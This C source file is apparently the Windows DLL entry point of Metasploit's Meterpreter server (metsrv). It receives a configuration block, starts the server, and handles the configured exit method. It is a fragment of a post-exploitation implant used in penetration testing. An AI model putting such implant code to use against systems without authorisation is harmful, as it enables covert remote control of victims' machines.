#include "metsrv.h"
#include "config.h"

#ifdef _WIN32

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
#include <excpt.h> 

#define	UnpackAndLinkLibs(p, s)

#endif

#ifdef _WIN32
DWORD __declspec(dllexport) Init(SOCKET fd)
{
	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
	// a pointer to the metserv configuration, so do a nasty cast and move on.
	MetsrvConfig* metConfig = (MetsrvConfig*)fd;
	dprintf("[METSRV] Getting ready to init with config %p", metConfig);
	DWORD result = server_setup(metConfig);

	dprintf("[METSRV] Exiting with %08x", metConfig->session.exit_func);

	// We also handle exit func directly in metsrv now because the value is added to the
	// configuration block and we manage to save bytes in the stager/header as well.
	switch (metConfig->session.exit_func)
	{
	case EXITFUNC_SEH:
		SetUnhandledExceptionFilter(NULL);
		break;
	case EXITFUNC_THREAD:
		ExitThread(0);
		break;
	case EXITFUNC_PROCESS:
		ExitProcess(0);
		break;
	default:
		break;
	}
	return result;
}
#else

// rtld dynamically links libc/libm/libcrypto/libssl/metsrv_main
// then calls server_setup for us ;D

#endif
